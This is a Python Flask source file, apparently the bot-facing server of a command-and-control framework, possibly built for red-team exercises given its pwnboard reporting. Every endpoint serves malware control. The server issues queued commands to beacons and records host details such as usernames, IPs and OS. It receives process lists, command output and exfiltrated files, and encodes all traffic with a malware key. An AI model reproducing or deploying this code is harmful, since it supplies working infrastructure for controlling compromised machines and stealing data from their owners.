import os
import time
import datetime
import uuid
import json
import re

from flask import request
import flask
from werkzeug.utils import secure_filename

from c2.app import app
from c2.app import get_db
from c2.database import get_bot_record as dbget
from c2.database import update_bot_record as db
from c2.pwnboard.pwnboard import send_update
from c2.util import mal_encode, mal_decode, file_decrypt
from c2.api.action import Verb


@app.route(app.config['ENDPOINTS']['HEARTBEAT'], methods=['POST'])
@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Beacon heartbeat endpoint
    Used by the bot to check in and get additional commands
    If there are no commands to execute, returns {"action":"ok"} which is an Ok/NOP
    Uses X-Session-ID cookie as a bot UUID

    :return: command for bot to execute
    """
    if request.method == 'POST':
        conn = get_db()
        checkin = int(time.time())

        # if request has no cookie, assume this is a new bot and issue it a new X-Session-ID cookie (UUID)
        if 'X-Session-ID' not in request.cookies:
            print("New checkin at " + str(checkin))
            response_json = {}
            if app.info_on_first_checkin:
                response_json["action"] = "info"
            else:
                response_json["action"] = "ok"
            resp = flask.Response(mal_encode(app.malware_key, json.dumps(response_json)))
            bot_id = uuid.uuid1()
            print("Adding new UUID to db:" + str(bot_id))
            resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
            db.add_bot_to_db(conn, str(bot_id), checkin)
            return resp
        else:
            id = request.cookies['X-Session-ID']
            db.add_bot_to_db(conn, id, checkin) # just in case bot isn't in DB (old bot reconnecting)
            db.checkin(conn, id)
            command = dbget.pop_bot_queuedcommand(conn, id)
            if command != "":
                return mal_encode(app.malware_key, command)

            """
                This part below updates pwnboard to reflect the beacon
            """
            if app.pwnboard_enabled:
                nwaddrstring = dbget.bot_ips(conn, id)
                print(nwaddrstring)
                if nwaddrstring != None and nwaddrstring != []:
                    ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", str(nwaddrstring))
                    if len(ips) > 0:
                        send_update(ips[0], app.pwnboard_host)
        action = {}
        action['action'] = Verb.ok.value
        return mal_encode(app.malware_key, json.dumps(action))


@app.route(app.config['ENDPOINTS']['INFO'], methods=['POST'])
@app.route('/info', methods=['POST'])
def info():
    """
    Endpoint for receiving info from bot and updating record in DB
    Order: public IP, username, device-name, region, memory amount, network_addresses (comma delimited)
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            id = request.cookies['X-Session-ID']
            d = mal_decode(app.malware_key, request.data)
            conn = get_db()

            jdata = json.loads(d)
            db.update_ip(conn, id, jdata["publicip"])
            db.update_username(conn, id, jdata["username"])
            db.update_devicename(conn, id, jdata["computername"])
            db.update_region(conn, id, jdata["region"])
            db.update_memory(conn, id, jdata["memory"])
            db.update_networkaddresses(conn, id, jdata["netinfo"])
            db.update_os(conn, id, jdata["osinfo"])
            return mal_encode(app.malware_key, "Success")


@app.route(app.config['ENDPOINTS']['PS'], methods=['POST'])
@app.route('/ps', methods=['POST'])
def ps():
    """
    Endpoint for JSON-formatted process list
    Updates list in DB accordingly
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            conn = get_db()
            proc_string = mal_decode(app.malware_key, request.data)
            db.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
            return mal_encode(app.malware_key, "Successfully updated process list")


@app.route(app.config['ENDPOINTS']['UPLOAD'], methods=['POST'])
@app.route('/upload', methods=['POST'])
def upload():
    """
    Endpoint for file uploads
    Takes file named "file" and writes it to upload directory\sessionid\timestamp_filename
    :return:
    """
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files or 'X-Session-ID' not in request.cookies:
            print("No file detected")
            return mal_encode(app.malware_key, "Error with file upload")

        file = request.files['file']
        # if user does not select file, browser also submit an empty part without filename
        if file.filename == '':
            print('No selected file')
            return mal_encode(app.malware_key, "Error with file upload")
        print(file.filename)
        if file:
            filename = secure_filename(str(int(time.time())) + "_" + file.filename)
            cookiename = secure_filename(request.cookies['X-Session-ID'])
            dir = app.config['UPLOAD_FOLDER'] + os.sep + cookiename
            if not os.path.exists(dir):
                os.makedirs(dir)
            file.save(os.path.join(dir, filename))
            file_decrypt(dir, filename, app.xor_key)
            return mal_encode(app.malware_key, "Successfully uploaded file")
    return mal_encode(app.malware_key, "Something went wrong")


@app.route(app.config['ENDPOINTS']['OUT'], methods=['POST'])
@app.route('/out', methods=['POST'])
def out():
    """
    Endpoint for command output
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            conn = get_db()
            out_string = mal_decode(app.malware_key, request.data)
            parsed = json.loads(out_string)
            command = parsed["command"]
            output = parsed["output"]
            db.update_commandout(conn, request.cookies['X-Session-ID'], command, output)
            return mal_encode(app.malware_key, "Output updated successfully")